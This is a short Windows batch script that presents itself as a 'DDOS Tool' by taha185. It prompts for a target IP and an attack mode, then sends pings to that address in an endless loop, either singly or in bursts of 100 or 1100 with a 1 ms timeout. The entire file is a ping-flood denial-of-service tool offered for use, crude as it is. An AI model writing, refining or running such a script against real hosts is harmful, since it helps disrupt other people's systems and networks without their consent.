@echo off
title DDOS Tool made by taha185
color 0a
echo _________________________________________
echo you are using this tool at your risk 
echo Shout to you :]
echo _________________________________________
timeout 3
cls
set /p ip="Enter target IP: "

echo Select the attack type:
echo 1. Regular ping
echo 2. High-frequency ping (1100) (can be slow!)
echo 3. Medium-frequency ping (100)
set /p attackType="Enter choice (1/2/3): "

if "%attackType%"=="1" goto a
if "%attackType%"=="2" goto b
if "%attackType%"=="3" goto c

:a
ping -n 1 -w 1 %ip%
goto a

:b
ping -n 1100 -w 1 %ip%
goto b

:c
ping -n 100 -w 1 %ip%
goto c

